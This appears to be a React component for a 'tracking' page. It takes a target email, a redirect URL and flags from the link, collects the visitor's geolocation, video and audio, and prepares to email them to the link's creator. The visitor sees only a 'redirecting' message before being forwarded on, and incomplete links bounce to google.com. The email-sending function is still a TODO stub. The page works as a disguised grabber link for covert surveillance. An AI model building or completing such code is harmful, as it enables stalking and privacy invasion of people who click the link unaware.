import React, { useEffect } from "react";
import { Helmet } from "react-helmet";
import { useTranslation } from "react-i18next";
import { useLocation } from "react-router-dom";

import { getUserData } from "../../Services/EnvironmentDataService";
import { TrackingRequest } from "../../Types/Types";
import Title from "../Atoms/Title";
import ContentWrapper from "../Molecules/ContentWrapper";

function useQuery() {
  return new URLSearchParams(useLocation().search);
}

const ObjectToFormData = (obj: any): FormData => {
  let formData = new FormData();
  for (let key in obj) {
    formData.append(key, obj[key]);
  }
  return formData;
};

const Tracking: React.FC = () => {
  const { t } = useTranslation();
  const query = useQuery();

  const getTrackingRequest = (): {
    trackingRequest: TrackingRequest;
    allUrlParamsWereSupplied: boolean;
  } => {
    // extract trackingRequest's values from url params
    let trackingRequest = {
      email: query.get("email") ?? "",
      redirectUrl: query.get("redirectUrl") ?? "",
      askGeolocation: !!query.get("askGeolocation"),
      askVideo: !!query.get("askVideo"),
      askAudio: !!query.get("askAudio"),
    };
    // validate if all url params are presented
    let allUrlParamsWereSupplied = true;
    Object.values(trackingRequest).forEach((value) => {
      if (typeof value === "string" && !value.length)
        allUrlParamsWereSupplied = false;
    });

    return {
      trackingRequest,
      allUrlParamsWereSupplied,
    };
  };

  const sendUserDataToSpecifiedEmail = async (
    toEmail: string,
    userData: FormData
  ) => {
    // TODO: implement a logic of sending an email with attachments
  };

  const handlePageFlow = async () => {
    const { trackingRequest, allUrlParamsWereSupplied } = getTrackingRequest();
    if (!allUrlParamsWereSupplied) window.location.href = "https://google.com/"; // If some of the data is missing, redirect user to google.com
    // get data about user
    const userData = await getUserData({
      askGeolocation: trackingRequest.askGeolocation,
      askAudio: trackingRequest.askAudio,
      askVideo: trackingRequest.askVideo,
    });
    console.log({ userData });
    // convert an Object to a formData
    const formData = ObjectToFormData(userData);
    // send an email
    await sendUserDataToSpecifiedEmail(trackingRequest.email, formData);
    // redirect to redirectUrl
    window.location.href = trackingRequest.redirectUrl;
  };

  useEffect(() => {
    handlePageFlow();
  }, [query]);

  return (
    <>
      <Helmet>
        <title>{t("seo.tracking.title")}</title>
        <meta name="description" content={t("seo.tracking.description")} />
      </Helmet>
      <ContentWrapper>
        <Title>{t("tracking.redirecting")}</Title>
      </ContentWrapper>
    </>
  );
};

export default Tracking;
